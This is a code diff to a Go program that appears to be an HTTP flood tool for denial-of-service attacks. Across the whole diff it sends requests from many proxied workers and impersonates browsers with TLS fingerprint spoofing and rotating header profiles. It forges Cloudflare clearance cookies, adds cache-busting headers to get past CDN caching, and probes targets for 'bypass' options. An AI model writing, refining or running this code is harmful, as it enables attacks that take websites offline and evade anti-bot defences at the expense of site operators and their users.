@@ -59,35 +59,7 @@ type BPF struct {
 	Referer      string
 	Origin       string
 	DNT          string
-	Preset       int
 	StaticHeaders []headerItem
-}
-
-var presetList = []utls.ClientHelloID{
-	utls.HelloChrome_124,
-	utls.HelloFirefox_120,
-	utls.HelloEdge_120,
-	utls.HelloSafari_16_0,
-}
-
-const (
-	PRESET_CHROME = iota
-	PRESET_FIREFOX
-	PRESET_EDGE
-	PRESET_SAFARI
-)
-
-func getPresetIndex(ua string) int {
-	if strings.Contains(ua, "Firefox") && !strings.Contains(ua, "Edg") {
-		return PRESET_FIREFOX
-	}
-	if strings.Contains(ua, "Edg") || strings.Contains(ua, "Edge") {
-		return PRESET_EDGE
-	}
-	if strings.Contains(ua, "Safari") && !strings.Contains(ua, "Chrome") && !strings.Contains(ua, "Edg") {
-		return PRESET_SAFARI
-	}
-	return PRESET_CHROME
 }
 
 var PFS = []BPF{
@@ -114,6 +86,21 @@ var PFS = []BPF{
 		SecChUa:      `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
 		SecChUaMov:   "?0",
 		SecChUaPlat:  "macOS",
+		SecFetchSite: "none",
+		SecFetchMode: "navigate",
+		SecFetchDest: "document",
+		Referer:      "https://www.google.com/search?q=",
+		Origin:       "https://www.google.com",
+		DNT:          "",
+	},
+	{
+		UA:           "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
+		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+		Lang:         "en-US,en;q=0.9",
+		Encoding:     "gzip, deflate, br",
+		SecChUa:      `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
+		SecChUaMov:   "?1",
+		SecChUaPlat:  "Android",
 		SecFetchSite: "none",
 		SecFetchMode: "navigate",
 		SecFetchDest: "document",
@@ -167,7 +154,37 @@ var PFS = []BPF{
 		DNT:          "",
 	},
 	{
+		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
+		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+		Lang:         "en-US,en;q=0.9",
+		Encoding:     "gzip, deflate, br",
+		SecChUa:      `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
+		SecChUaMov:   "?0",
+		SecChUaPlat:  "Windows",
+		SecFetchSite: "none",
+		SecFetchMode: "navigate",
+		SecFetchDest: "document",
+		Referer:      "https://www.google.com/search?q=",
+		Origin:       "https://www.google.com",
+		DNT:          "",
+	},
+	{
 		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
+		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+		Lang:         "en-US,en;q=0.9",
+		Encoding:     "gzip, deflate, br",
+		SecChUa:      "",
+		SecChUaMov:   "",
+		SecChUaPlat:  "",
+		SecFetchSite: "none",
+		SecFetchMode: "navigate",
+		SecFetchDest: "document",
+		Referer:      "https://www.google.com/search?q=",
+		Origin:       "",
+		DNT:          "",
+	},
+	{
+		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
 		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
 		Lang:         "en-US,en;q=0.9",
 		Encoding:     "gzip, deflate, br",
@@ -185,8 +202,6 @@ var PFS = []BPF{
 
 func init() {
 	for i := range PFS {
-		PFS[i].Preset = getPresetIndex(PFS[i].UA)
-		// Pre-compute static headers for each profile
 		PFS[i].StaticHeaders = buildStaticHeaders(PFS[i])
 	}
 }
@@ -222,6 +237,8 @@ var (
 	validMethods       []string
 	validEncodings     []string
 	validCacheControls []string
+	skipVerify         bool
+	maxBodyReadSize    int64 = 4096
 )
 
 var cacheParams = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
@@ -297,6 +314,44 @@ func randHex(n int) string {
 func generateBypassCookie() string {
 	ts := time.Now().Unix()
 	return fmt.Sprintf("cf_clearance=%s_%d-1.2.1.1-%s", randHex(22), ts, randHex(6))
+}
+
+func probeCertificate(host string) bool {
+	conn, err := tls.Dial("tcp", net.JoinHostPort(host, "443"), &tls.Config{
+		ServerName:         host,
+		InsecureSkipVerify: false,
+	})
+	if err == nil {
+		conn.Close()
+		return true
+	}
+	return false
+}
+
+func probeBodySize(target string) int64 {
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	req, err := http.NewRequest("HEAD", target, nil)
+	if err != nil {
+		return 4096
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0")
+	resp, err := client.Do(req)
+	if err != nil {
+		return 4096
+	}
+	defer resp.Body.Close()
+	if resp.ContentLength > 0 {
+		if resp.ContentLength > 1024*1024 {
+			return 1024 * 1024
+		}
+		return resp.ContentLength
+	}
+	return 4096
 }
 
 func BypassMaxPayload(target string) int {
@@ -690,6 +745,20 @@ func main() {
 		host = host[4:]
 	}
 
+	if probeCertificate(host) {
+		skipVerify = false
+		fmt.Println("[INFO] Certificate valid, using full verification")
+	} else {
+		skipVerify = true
+		fmt.Println("[INFO] Certificate invalid/self-signed, skipping verification")
+	}
+
+	maxBodyReadSize = probeBodySize(target)
+	if maxBodyReadSize == 0 {
+		maxBodyReadSize = 4096
+	}
+	fmt.Printf("[INFO] Max body read size set to %d bytes\n", maxBodyReadSize)
+
 	proxyIPs := []string{}
 	for _, p := range proxies {
 		if p != nil {
@@ -717,56 +786,16 @@ func main() {
 		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/10)
 	}
 
-	go func() {
-		defer wg.Done()
-		maxPayloadSize = BypassMaxPayload(target)
-		printProbe("Payload")
-	}()
-	go func() {
-		defer wg.Done()
-		maxHeaderSize = BypassMaxHeader(target)
-		printProbe("Header")
-	}()
-	go func() {
-		defer wg.Done()
-		bypassSupport = BypassHeaderBypass(target, firstProxyIP)
-		printProbe("All Bypass")
-	}()
-	go func() {
-		defer wg.Done()
-		httpVersion = BypassHTTPVersion(target)
-		printProbe("HTTP/2")
-	}()
-	go func() {
-		defer wg.Done()
-		validOrigins = BypassOrigins(target)
-		printProbe("Origin")
-	}()
-	go func() {
-		defer wg.Done()
-		validUserAgents = BypassUserAgents(target)
-		printProbe("UA")
-	}()
-	go func() {
-		defer wg.Done()
-		validReferers = BypassReferers(target)
-		printProbe("Referer")
-	}()
-	go func() {
-		defer wg.Done()
-		validMethods = BypassMethods(target)
-		printProbe("Method")
-	}()
-	go func() {
-		defer wg.Done()
-		validEncodings = BypassEncodings(target)
-		printProbe("Encoding")
-	}()
-	go func() {
-		defer wg.Done()
-		validCacheControls = BypassCacheControls(target)
-		printProbe("Cache")
-	}()
+	go func() { defer wg.Done(); maxPayloadSize = BypassMaxPayload(target); printProbe("Payload") }()
+	go func() { defer wg.Done(); maxHeaderSize = BypassMaxHeader(target); printProbe("Header") }()
+	go func() { defer wg.Done(); bypassSupport = BypassHeaderBypass(target, firstProxyIP); printProbe("All Bypass") }()
+	go func() { defer wg.Done(); httpVersion = BypassHTTPVersion(target); printProbe("HTTP/2") }()
+	go func() { defer wg.Done(); validOrigins = BypassOrigins(target); printProbe("Origin") }()
+	go func() { defer wg.Done(); validUserAgents = BypassUserAgents(target); printProbe("UA") }()
+	go func() { defer wg.Done(); validReferers = BypassReferers(target); printProbe("Referer") }()
+	go func() { defer wg.Done(); validMethods = BypassMethods(target); printProbe("Method") }()
+	go func() { defer wg.Done(); validEncodings = BypassEncodings(target); printProbe("Encoding") }()
+	go func() { defer wg.Done(); validCacheControls = BypassCacheControls(target); printProbe("Cache") }()
 	wg.Wait()
 	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
 
@@ -856,58 +885,60 @@ func main() {
 		})
 	}
 
-	numPresets := len(presetList)
-	clients := make([][]*http.Client, len(proxies))
+	type clientWrap struct {
+		client *http.Client
+		ip     string
+	}
+	clients := make([]clientWrap, len(proxies))
 	for i, proxyURL := range proxies {
-		clients[i] = make([]*http.Client, numPresets)
-		for pIdx := 0; pIdx < numPresets; pIdx++ {
-			preset := presetList[pIdx]
-			tr := &http.Transport{
-				DialContext: (&net.Dialer{
-					Timeout:   4 * time.Second,
-					KeepAlive: KEEP_ALIVE,
-				}).DialContext,
-				DisableKeepAlives:     false,
-				DisableCompression:    false,
-				MaxIdleConns:          10000,
-				MaxIdleConnsPerHost:   5000,
-				MaxConnsPerHost:       0,
-				IdleConnTimeout:       KEEP_ALIVE,
-				TLSClientConfig:       nil,
-				ForceAttemptHTTP2:     true,
-				TLSHandshakeTimeout:   4 * time.Second,
-				ResponseHeaderTimeout: 4 * time.Second,
-				ExpectContinueTimeout: 0 * time.Second,
-				DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
-					dialer := &net.Dialer{
-						Timeout:   4 * time.Second,
-						KeepAlive: KEEP_ALIVE,
-					}
-					conn, err := dialer.DialContext(ctx, network, addr)
-					if err != nil {
-						return nil, err
-					}
-					h, _, _ := net.SplitHostPort(addr)
-					if h == "" {
-						h = parsedTarget.Hostname()
-					}
-					config := &tls.Config{
-						ServerName:         h,
-						InsecureSkipVerify: true,
-					}
-					uconn := utls.UClient(conn, config, preset)
-					if err := uconn.Handshake(); err != nil {
-						conn.Close()
-						return nil, err
-					}
-					return uconn, nil
-				},
-			}
-			if proxyURL != nil {
-				tr.Proxy = http.ProxyURL(proxyURL)
-			}
-			jar, _ := cookiejar.New(nil)
-			clients[i][pIdx] = &http.Client{Transport: tr, Timeout: TIMEOUT, Jar: jar}
+		tr := &http.Transport{
+			DialContext: (&net.Dialer{
+				Timeout:   4 * time.Second,
+				KeepAlive: KEEP_ALIVE,
+			}).DialContext,
+			DisableKeepAlives:     false,
+			DisableCompression:    false,
+			MaxIdleConns:          10000,
+			MaxIdleConnsPerHost:   5000,
+			MaxConnsPerHost:       0,
+			IdleConnTimeout:       KEEP_ALIVE,
+			TLSClientConfig:       nil,
+			ForceAttemptHTTP2:     true,
+			TLSHandshakeTimeout:   4 * time.Second,
+			ResponseHeaderTimeout: 4 * time.Second,
+			ExpectContinueTimeout: 0 * time.Second,
+			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+				dialer := &net.Dialer{Timeout: 4 * time.Second, KeepAlive: KEEP_ALIVE}
+				conn, err := dialer.DialContext(ctx, network, addr)
+				if err != nil {
+					return nil, err
+				}
+				h, _, _ := net.SplitHostPort(addr)
+				if h == "" {
+					h = parsedTarget.Hostname()
+				}
+				config := &utls.Config{
+					ServerName:         h,
+					InsecureSkipVerify: skipVerify,
+				}
+				uconn := utls.UClient(conn, config, utls.HelloChrome_Auto)
+				if err := uconn.Handshake(); err != nil {
+					conn.Close()
+					return nil, err
+				}
+				return uconn, nil
+			},
+		}
+		_ = http2.ConfigureTransport(tr)
+		ip := ""
+		if proxyURL != nil {
+			tr.Proxy = http.ProxyURL(proxyURL)
+			ip = proxyURL.Hostname()
+		}
+		jar, _ := cookiejar.New(nil)
+		clients[i] = clientWrap{
+			client: &http.Client{Transport: tr, Timeout: TIMEOUT, Jar: jar},
+			ip:     ip,
 		}
 	}
 
@@ -916,28 +947,19 @@ func main() {
 	for i := 0; i < POOL_SIZE; i++ {
 		precomputedPaths[i] = "/" + getRandString() + "/"
 	}
-	precomputedCacheBusters := make([]string, POOL_SIZE)
-	for i := 0; i < POOL_SIZE; i++ {
-		precomputedCacheBusters[i] = strconv.FormatInt(getRandInt(), 16)
-	}
-	precomputedIfModifiedSince := make([]string, 10)
-	for i := 0; i < 10; i++ {
-		precomputedIfModifiedSince[i] = time.Now().AddDate(-1, 0, -i).Format(time.RFC1123)
-	}
 	precomputedReferers := make([]string, len(validReferers))
 	copy(precomputedReferers, validReferers)
 
 	for w := 0; w < WORKER_COUNT; w++ {
 		wg2.Add(1)
-		go func(workerID int) {
+		cw := clients[w%len(clients)]
+		go func(cli clientWrap, workerID int) {
 			defer wg2.Done()
 			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
 
 			for ctx.Err() == nil {
-				proxyIdx := rng.Intn(len(clients))
 				profIdx := rng.Intn(len(PFS))
 				prof := PFS[profIdx]
-				client := clients[proxyIdx][prof.Preset]
 
 				method := validMethods[rng.Intn(len(validMethods))]
 				ua := prof.UA
@@ -948,10 +970,7 @@ func main() {
 				cacheCtrl := validCacheControls[rng.Intn(len(validCacheControls))]
 
 				forIP := proxyIPs[rng.Intn(len(proxyIPs))]
-				realIP := ""
-				if proxyIdx < len(proxyIPs) {
-					realIP = proxyIPs[proxyIdx]
-				}
+				realIP := cli.ip
 				if realIP == "" {
 					realIP = forIP
 				}
@@ -1039,6 +1058,9 @@ func main() {
 
 				headers = append(headers, prof.StaticHeaders...)
 
+				headers = append(headers, headerItem{"If-Modified-Since", time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)})
+				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(getRandInt(), 16)})
+
 				if rng.Intn(3) == 0 {
 					headers = append(headers, headerItem{"TE", "trailers"})
 				}
@@ -1119,14 +1141,15 @@ func main() {
 				rng.Shuffle(len(headers), func(i, j int) {
 					headers[i], headers[j] = headers[j], headers[i]
 				})
+
 				req.Header = make(http.Header)
 				for _, h := range headers {
-					req.Header.Set(h.key, h.value)
+					req.Header.Add(h.key, h.value)
 				}
 
-				resp, err := client.Do(req)
+				resp, err := cli.client.Do(req)
 				if err == nil {
-					io.Copy(io.Discard, resp.Body)
+					io.Copy(io.Discard, io.LimitReader(resp.Body, maxBodyReadSize))
 					resp.Body.Close()
 					atomic.AddInt64(&totalRequests, 1)
 				} else {
@@ -1135,7 +1158,7 @@ func main() {
 
 				headerPool.Put(headers)
 			}
-		}(w)
+		}(cw, w)
 	}
 
 	sig := make(chan os.Signal, 1)
